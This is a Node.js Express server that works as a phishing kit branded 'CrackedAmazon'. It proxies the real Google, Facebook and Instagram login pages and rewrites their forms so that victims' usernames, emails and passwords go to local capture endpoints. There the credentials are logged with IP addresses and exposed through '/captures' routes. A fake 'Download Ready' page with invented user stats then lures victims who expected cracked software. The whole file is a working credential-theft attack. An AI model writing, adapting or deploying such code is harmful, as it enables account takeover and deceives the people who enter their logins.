const express = require('express');
const { createProxyMiddleware, fixRequestBody } = require('http-proxy-middleware');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({
    secret: 'crackedamazon-secret-key-2026',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false, maxAge: 3600000 }
}));
app.use(express.static(__dirname));

// Ensure captures directory exists
const capturesDir = path.join(__dirname, 'captures');
if (!fs.existsSync(capturesDir)) {
    fs.mkdirSync(capturesDir);
}

// ============================================
// GOOGLE AUTH
// ============================================
app.get('/auth/google', async (req, res) => {
    const tool = req.query.tool || 'unknown';
    req.session.tool = tool;
    req.session.provider = 'google';
    
    try {
        const response = await fetch('https://accounts.google.com/v3/signin/identifier', {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        
        let html = await response.text();
        
        // Completely rewrite all forms to point to our capture endpoint
        html = html.replace(/<form/g, '<form novalidate');
        html = html.replace(/action="[^"]*"/g, 'action="/capture/google"');
        html = html.replace(/method="[^"]*"/g, 'method="POST"');
        
        // Inject hidden field for tool tracking
        html = html.replace('</form>', `<input type="hidden" name="tool" value="${tool}"></form>`);
        
        res.send(html);
    } catch (error) {
        console.error('Google fetch error:', error);
        res.redirect('/');
    }
});

app.post('/capture/google', (req, res) => {
    const { email, password, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    
    const captureData = {
        timestamp: new Date().toISOString(),
        provider: 'google',
        email,
        password,
        tool: tool || req.session.tool || 'unknown',
        ip,
        userAgent
    };
    
    // Save to file
    const filename = path.join(capturesDir, `google_${Date.now()}.json`);
    fs.writeFileSync(filename, JSON.stringify(captureData, null, 2));
    
    // Also append to master log
    fs.appendFileSync('captures.txt', JSON.stringify(captureData) + '\n');
    
    console.log('✅ GOOGLE CAPTURED:', email, password);
    
    // Redirect to download page
    res.redirect(`/download?tool=${captureData.tool}`);
});

// ============================================
// FACEBOOK AUTH
// ============================================
app.get('/auth/facebook', async (req, res) => {
    const tool = req.query.tool || 'unknown';
    req.session.tool = tool;
    req.session.provider = 'facebook';
    
    try {
        const response = await fetch('https://www.facebook.com/login/', {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        
        let html = await response.text();
        
        html = html.replace(/<form/g, '<form novalidate');
        html = html.replace(/action="[^"]*"/g, 'action="/capture/facebook"');
        html = html.replace(/method="[^"]*"/g, 'method="POST"');
        html = html.replace('</form>', `<input type="hidden" name="tool" value="${tool}"></form>`);
        
        res.send(html);
    } catch (error) {
        console.error('Facebook fetch error:', error);
        res.redirect('/');
    }
});

app.post('/capture/facebook', (req, res) => {
    const { email, pass, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    
    const captureData = {
        timestamp: new Date().toISOString(),
        provider: 'facebook',
        email,
        password: pass,
        tool: tool || req.session.tool || 'unknown',
        ip,
        userAgent
    };
    
    const filename = path.join(capturesDir, `facebook_${Date.now()}.json`);
    fs.writeFileSync(filename, JSON.stringify(captureData, null, 2));
    fs.appendFileSync('captures.txt', JSON.stringify(captureData) + '\n');
    
    console.log('✅ FACEBOOK CAPTURED:', email, pass);
    res.redirect(`/download?tool=${captureData.tool}`);
});

// ============================================
// INSTAGRAM AUTH
// ============================================
app.get('/auth/instagram', async (req, res) => {
    const tool = req.query.tool || 'unknown';
    req.session.tool = tool;
    req.session.provider = 'instagram';
    
    try {
        const response = await fetch('https://www.instagram.com/accounts/login/', {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        
        let html = await response.text();
        
        html = html.replace(/<form/g, '<form novalidate');
        html = html.replace(/action="[^"]*"/g, 'action="/capture/instagram"');
        html = html.replace(/method="[^"]*"/g, 'method="POST"');
        html = html.replace('</form>', `<input type="hidden" name="tool" value="${tool}"></form>`);
        
        res.send(html);
    } catch (error) {
        console.error('Instagram fetch error:', error);
        res.redirect('/');
    }
});

app.post('/capture/instagram', (req, res) => {
    const { username, password, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    
    const captureData = {
        timestamp: new Date().toISOString(),
        provider: 'instagram',
        username,
        password,
        tool: tool || req.session.tool || 'unknown',
        ip,
        userAgent
    };
    
    const filename = path.join(capturesDir, `instagram_${Date.now()}.json`);
    fs.writeFileSync(filename, JSON.stringify(captureData, null, 2));
    fs.appendFileSync('captures.txt', JSON.stringify(captureData) + '\n');
    
    console.log('✅ INSTAGRAM CAPTURED:', username, password);
    res.redirect(`/download?tool=${captureData.tool}`);
});

// ============================================
// DOWNLOAD PAGE
// ============================================
app.get('/download', (req, res) => {
    const tool = req.query.tool || req.session.tool || 'tool';
    const toolName = tool.replace(/-/g, ' ').replace(/_/g, ' ');
    
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Download - CrackedAmazon</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
                color: white;
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
            }
            .card {
                background: rgba(255,255,255,0.05);
                backdrop-filter: blur(10px);
                border-radius: 32px;
                padding: 48px 32px;
                max-width: 500px;
                width: 100%;
                border: 1px solid rgba(249,115,22,0.3);
                box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
                text-align: center;
            }
            .success-icon {
                width: 80px;
                height: 80px;
                background: #10b981;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 24px;
                font-size: 40px;
                animation: pulse 2s infinite;
            }
            @keyframes pulse {
                0%,100% { transform: scale(1); }
                50% { transform: scale(1.1); }
            }
            h1 {
                color: #f97316;
                margin-bottom: 16px;
                font-size: 32px;
            }
            .tool-badge {
                background: rgba(249,115,22,0.2);
                padding: 8px 24px;
                border-radius: 50px;
                display: inline-block;
                margin: 16px 0;
                color: #f97316;
                font-weight: 600;
            }
            .btn {
                background: linear-gradient(135deg, #f97316, #ef4444);
                color: white;
                border: none;
                padding: 16px 32px;
                border-radius: 50px;
                font-size: 18px;
                font-weight: 600;
                width: 100%;
                cursor: pointer;
                margin: 24px 0;
                transition: transform 0.3s;
            }
            .btn:hover {
                transform: translateY(-2px);
            }
            .stats {
                display: flex;
                justify-content: space-around;
                margin-top: 24px;
                padding-top: 24px;
                border-top: 1px solid rgba(255,255,255,0.1);
                color: #94a3b8;
                font-size: 14px;
            }
        </style>
    </head>
    <body>
        <div class="card">
            <div class="success-icon">✓</div>
            <h1>Download Ready!</h1>
            <div class="tool-badge">${toolName}</div>
            <p style="color: #94a3b8; margin: 16px 0;">Your file has been verified and is ready to download.</p>
            <button class="btn" onclick="startDownload()">Download Now</button>
            <div class="stats">
                <span>⚡ 2,304 today</span>
                <span>⭐ 4.8 rating</span>
                <span>📦 50k+ users</span>
            </div>
        </div>
        <script>
            function startDownload() {
                alert('Download started! Check your downloads folder.');
                document.querySelector('.btn').textContent = 'Downloading...';
                document.querySelector('.btn').style.background = '#10b981';
            }
            setTimeout(startDownload, 3000);
        </script>
    </body>
    </html>
    `);
});

// ============================================
// VIEW CAPTURES
// ============================================
app.get('/captures', (req, res) => {
    const files = fs.readdirSync(capturesDir);
    const captures = files.map(f => {
        try {
            return JSON.parse(fs.readFileSync(path.join(capturesDir, f)));
        } catch (e) {
            return null;
        }
    }).filter(Boolean);
    
    res.json(captures);
});

app.get('/captures.txt', (req, res) => {
    res.sendFile(path.join(__dirname, 'captures.txt'));
});

// ============================================
// HEALTH CHECK
// ============================================
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        time: new Date().toISOString(),
        captures: fs.readdirSync(capturesDir).length
    });
});

// ============================================
// HOME PAGE
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, '0.0.0.0', () => {
    console.log('\n' + '='.repeat(70));
    console.log('🔥 CRACKEDAMAZON - COMPLETE WORKING SYSTEM');
    console.log('='.repeat(70));
    console.log(`\n📱 Server URL: http://localhost:${PORT}`);
    console.log(`\n🔐 AVAILABLE LOGIN METHODS:`);
    console.log(`   • Google:    /auth/google?tool=name`);
    console.log(`   • Facebook:  /auth/facebook?tool=name`);
    console.log(`   • Instagram: /auth/instagram?tool=name`);
    console.log(`\n📊 CAPTURES:`);
    console.log(`   • Individual: /captures/ (JSON files)`);
    console.log(`   • Master log: /captures.txt`);
    console.log(`\n✅ STATUS: FULLY OPERATIONAL`);
    console.log('='.repeat(70) + '\n');
});
